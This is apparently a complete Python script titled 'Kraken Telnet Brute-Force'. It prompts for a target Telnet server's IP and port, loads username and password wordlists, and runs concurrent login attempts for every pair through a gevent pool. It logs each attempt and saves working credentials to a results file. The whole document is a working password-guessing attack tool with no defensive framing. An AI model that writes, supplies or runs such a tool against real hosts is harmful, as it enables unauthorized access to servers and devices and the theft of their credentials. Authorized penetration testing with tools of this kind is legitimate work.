import os
import sys
import time
import logging
import gevent
from gevent import monkey
from gevent.pool import Pool
from telnetlib import Telnet
from random import choice
from colorama import Fore, Style, init
import pyfiglet


monkey.patch_all()


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'telnet_brute_force.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken Telnet Brute-Force", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def load_file(filepath):
    """Loads usernames or passwords from a specified file."""
    if os.path.isfile(filepath):
        with open(filepath, "r") as file:
            lines = [line.strip() for line in file if line.strip()]
        logging.info(f"Loaded {len(lines)} entries from {filepath}.")
        return lines
    logging.error(f"File not found: {filepath}")
    sys.exit(1)

def get_user_input():
    """Gathers all user inputs needed for the brute force operation."""
    host = input(Fore.WHITE + "Enter the IP address of the remote Telnet server: ").strip()
    port = int(input(Fore.WHITE + "Enter the port of the Telnet server (default is 23, press Enter for default): ") or 23)
    u_file = input(Fore.WHITE + "Enter the user file name or press Enter to use default ('users.txt'): ").strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
    p_file = input(Fore.WHITE + "Enter the password file name or press Enter to use default ('passwords.txt'): ").strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
    threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)
    return host, port, u_file, p_file, threads

def attempt_login(username, password, host, port, attempt_number, total_attempts, start_time, result_file):
    """Attempts to log in to the Telnet server using provided credentials."""
    def format_output(success):
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
        status = "Success" if success else ""
        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password} {status}"

    try:
        with Telnet(host, port, timeout=10) as tn:
            tn.read_until(b"login: ")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")
            result = tn.read_some().decode('ascii')

            sys.stdout.write('\033[K')  
            if "Login incorrect" in result:
                fail_msg = format_output(False)
                print(Fore.WHITE + fail_msg, end='', flush=True)
                logging.info(f"Failed: {username}:{password}")
                return None
            else:
                success_msg = format_output(True)
                print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
                logging.info(success_msg.strip())
                result_file.write(success_msg.strip() + "\n")
                result_file.flush()  
                return success_msg
    except Exception as e:
        sys.stdout.write('\033[K')  
        fail_msg = format_output(False)
        print(Fore.WHITE + fail_msg, end='', flush=True)
        logging.error(f"Error: {username}:{password} - {str(e)}")
        return None

def run_brute_force(host, port, users, passwords, threads):
    """Executes brute force login attempts using gevent pool."""
    total_attempts = len(users) * len(passwords)
    start_time = time.time()
    attempt_number = 0
    results = []
    pool = Pool(threads)

    result_file_path = os.path.join(results_dir, "telnet_results.txt")
    with open(result_file_path, "a") as result_file:  

        def handle_result(username, password):
            nonlocal attempt_number
            attempt_number += 1
            result = attempt_login(username, password, host, port, attempt_number, total_attempts, start_time, result_file)
            if result:
                results.append(result)

        for username in users:
            for password in passwords:
                pool.spawn(handle_result, username, password)

        pool.join()

    logging.info("Brute force process completed.")

def main():
    clear_console()
    display_banner()
    host, port, u_file, p_file, threads = get_user_input()
    users = load_file(u_file)
    passwords = load_file(p_file)
    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    run_brute_force(host, port, users, passwords, threads)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "\nScript interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
